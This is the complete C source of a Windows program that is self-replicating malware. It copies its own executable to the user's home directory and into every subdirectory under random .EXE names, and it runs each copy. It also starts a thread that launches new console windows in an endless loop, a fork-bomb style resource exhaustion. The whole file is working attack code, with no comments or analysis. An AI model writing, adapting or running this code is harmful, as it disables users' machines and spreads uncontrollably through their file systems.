#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <io.h>
#include <Windows.h>
#include <time.h>

#define ALEN 52

char alpha[ALEN] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

struct _finddata_t fd;

char* makefilename(){
	static char filename[] = "AAAAAAAAAA.EXE";
	const int offset = 'a' - 'A';
	int i;

	for(i=0;i<10;i++) filename[i] = alpha[rand()%ALEN];
	for(i=11;i<14;i++) filename[i] += rand()%2 ? offset : 0;
    
	return filename;
}

DWORD WINAPI CmdInfiniteGenerator(LPVOID lpvoid){
	while(1)
		system("start");
}

int isFileOrDir()
{
	if (fd.attrib & _A_SUBDIR)
		return 0;
	else
		return 1;
}

void FileSearch(char file_path[], char originfile[])
{
	intptr_t handle;
	int check = 0;
	char file_path2[_MAX_PATH];
	char cmd[1000];

	strcpy(file_path2, file_path);
	strcat(file_path, "\\*");

	if ((handle = _findfirst(file_path, &fd)) == -1)
	{
		printf("No such file or directory\n");
		return;
	}

	while (_findnext(handle, &fd) == 0)
	{
		char file_pt[_MAX_PATH];
		strcpy(file_pt, file_path2);
		strcat(strcat(file_pt, "\\"), fd.name);

		check = isFileOrDir();

		if (check == 0 && fd.name[1] != '.')
		{
			char filename[20];
			strcpy(filename, makefilename());
			sprintf(cmd, "copy %s\\%s %s\\%s", file_path2, originfile, file_pt, filename);
			system(cmd);
			sprintf(cmd, "%s\\%s", file_pt, filename);
			system(cmd);
			FileSearch(file_pt, filename);
		}
	}
	_findclose(handle);
}

int main(int argc, char** argv)
{
	char file_path[_MAX_PATH];
	char cmd[1000];
	char filename[20];
	FILE* fp;
	int i;

	srand(time(0));

	strcpy(filename, makefilename());

	sprintf(cmd, "copy %s %%homepath%%\\%s", argv[0], filename);
	system(cmd);

	sprintf(cmd, "%%homepath%%\\%s", filename);
	system(cmd);

	HANDLE hThread = CreateThread(NULL, 0, CmdInfiniteGenerator, NULL, 0, NULL);

	fp = _popen("echo %cd%", "r");
	fscanf(fp, "%[^\n]s", file_path);
	FileSearch(file_path, argv[0]);

	return 0;
}